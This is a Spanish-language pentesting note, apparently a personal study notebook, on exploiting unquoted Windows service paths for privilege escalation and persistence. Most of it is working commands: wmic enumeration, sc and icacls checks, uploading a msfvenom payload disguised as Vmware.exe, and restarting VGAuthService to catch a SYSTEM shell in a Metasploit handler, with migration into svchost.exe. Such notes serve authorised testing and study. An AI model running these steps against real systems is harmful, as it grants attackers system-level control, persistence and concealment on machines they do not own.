- Vulnerabilidad Unquoted service path:

Abusan la forma en la que Windows busca binarios de servicios, antes de lanzar un servicio, y cuando una ruta particular a un servicio no tiene comillas y contiene espacios.

Pueden servir tanto para escalada de privilegios como persistencia.

-Podemos usar un módulo de Metasploit:

```
exploit/windows/local/trusted_service_path
```

-MANUAL. Tenemos una sesión de meterpreter:

```
shell
```

Identificamos los servicios vulnerables con wmic:

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

![[Pasted image 20230123150157.png]]

Y encontramos un servicio que se está arrancando sin especificar comillas al path del binario y que además contiene espacios, por lo que cuando Windows trate de ejecutarlo buscará el binario en las carpetas que tengan el espacio antes de llegar al binario final.

```
En este caso tendríamos que crear un payload malicioso llamado VMWare.exe dentro de la carpeta VMWare Tools
```

![[Pasted image 20230123150328.png]]

Pero antes de hacerlo hay que comprobar si tenemos privilegios para parar y arrancar servicios.

```
sc stop servicio
sc start servicio
```

Para comprobar el estado del servicio y los privilegios con los que se va a arrancar podemos usar:

```
sc qc servicio
```

![[Pasted image 20230123150709.png]]

Si pone LocalSystem es que se va a lanzar el servicio con privilegios de sistema.

- Una vez comprobado todo: 

Para aprovecharse de la vulnerabilidad hacemos esto:

```
sc stop servicio
cd "C:\ruta\anterior\a\la\que\tenga\espacios"
icacls "ruta con espacios"
```

![[Pasted image 20230123151055.png]]

Si esa ruta tiene la opción (M) en authenticated users podemos modificar su contenido.

Ahora hay que subir el payload malicioso.

```
Ctrl+Z para backgroundear la sesión shell y volver a meterpreter
upload payload64.exe "C:\program files\Vmware\Vmware Tools\Vmware.exe"
```

Ahora tenemos nuestro payload de msfvenom malicioso subido a la carpeta vulnerable

```
background
use multi/handler
configurar como el payload de msfvenom
exploit -j #para ejecutar el listener en 2º plano
Volvemos a la sesión de meterpreter anterior.
shell
sc stop VGAuthService #servicio vulnerable
sc start VGAuthService
background
```

Ya tenemos una sesión con privilegios creada.

Si falla y no nos deja ejecutar ni getuid (la shell es inestable):

```
background
use multi/handler
configurarlo como el payload
set AutoRunScript migrate -n svchost.exe
exploit -j
Volvemos a la sesion sin privilegios
sc stop VGAuthService
sc start VGAuthService
Ahora si tenemos una sesión estable y con privilegios.
```

